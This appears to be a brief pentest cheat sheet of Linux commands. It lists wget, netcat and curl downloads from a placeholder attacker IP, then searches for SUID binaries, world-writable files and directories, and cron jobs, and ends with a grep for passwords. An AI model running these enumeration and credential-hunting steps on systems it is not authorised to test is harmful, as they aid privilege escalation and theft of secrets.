File Transfers
```bash
# wget
wget http://<ip>/file_name -O /path/to/save/file

# Netcat
nc -nv <ip> <port> > file/to/recv

# cURL
curl http://<ip>/file_name --output file_name
```

```bash
# Find useable Linux files
find / -perm -u=s -type f 2>/dev/null

# Find writeable files
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

# Find writeable directories
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null

# Disk Usage
sudo du -hsx ./* | sort -rh | head -n 40

# Cron Jobs
ls -la /etc/cron.daily/

grep password -B 5 -A 5 # below 5 above 5
```